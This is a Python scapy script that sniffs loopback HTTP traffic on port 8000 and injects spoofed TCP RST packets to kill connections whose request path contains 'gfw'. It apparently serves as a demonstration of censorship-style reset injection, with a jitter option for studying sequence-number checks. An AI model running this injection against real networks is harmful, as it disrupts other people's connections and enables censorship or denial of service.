from scapy.layers.http import *
from scapy.layers.inet import *
from scapy.sendrecv import *

DEFAULT_WINDOW_SIZE = 2052


def log(msg, **kwargs):
    formatted_params = " ".join([f"{k}={v}" for k, v in kwargs.items()])
    print(f"{msg} {formatted_params}")


def send_reset(iface, seq_jitter=0, ignore_syn=True):
    """Set seq_jitter to be non-zero in order to prove to yourself that the
    sequence number of a RST segment does indeed need to be exactly equal
    to the last sequence number ACK-ed by the receiver"""
    def f(p):
        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport
        seq = p[TCP].seq
        ack = p[TCP].ack
        flags = p[TCP].flags

        log("Grabbed packet", src_ip=src_ip, dst_ip=dst_ip, src_port=src_port, dst_port=dst_port, seq=seq, ack=ack)

        if "S" in flags and ignore_syn:
            log("Packet has SYN flag, not sending RST")
            return
        if not p.haslayer(HTTP):
            log('ignore non http packets')
            return

        if HTTPRequest in p:
            http_req = p[HTTPRequest]
            if b'gfw' in http_req.fields['Path']:
                # Don't allow a -ve seq
                jitter = random.randint(max(-seq_jitter, -seq), seq_jitter)
                if jitter == 0:
                    log("jitter == 0, this RST packet should close the connection")

                rst_seq = ack + jitter
                p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)

                log("Sending RST packet...", orig_ack=ack, jitter=jitter, seq=rst_seq)
                send(p, verbose=0, iface=iface)

    return f


def log_packet(p):
    """This prints a big pile of debug information. We could make a prettier
    log function if we wanted."""
    return p.show()


if __name__ == "__main__":
    iface = "lo0"
    localhost_ip = "127.0.0.1"
    localhost_server_port = 8000

    log("Starting sniff...")

    bind_layers(TCP, HTTP, sport=8000)
    bind_layers(TCP, HTTP, dport=8000)
    t = sniff(
        iface=iface,
        prn=send_reset(iface),
        # prn=log_packet,
    filter='port 8000')
    log("Finished sniffing!")
